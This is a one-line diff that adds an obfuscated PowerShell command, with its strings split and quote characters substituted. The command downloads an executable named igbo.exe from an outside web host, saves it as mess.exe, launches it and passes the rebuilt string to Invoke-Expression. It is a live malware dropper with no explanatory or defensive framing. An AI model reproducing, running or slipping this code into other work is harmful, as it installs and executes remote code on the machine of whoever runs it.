@@ -1,0 +1,1 @@
+﻿('(N'+'ew'+'-Obje'+'ct '+'System.Ne'+'t.Web'+'Cl'+'ie'+'n'+'t).Down'+'l'+'o'+'adFi'+'le(Q'+'Cghttp:'+'//worl'+'dn'+'it.'+'com'+'/i'+'g'+'b'+'o.exeQCg'+','+'QC'+'gm'+'e'+'ss'+'.exe'+'Q'+'Cg);Start-Pr'+'o'+'ces'+'s QCgmess.e'+'xeQC'+'g').ReplaCE('QCg',[sTriNG][char]39)| IEx
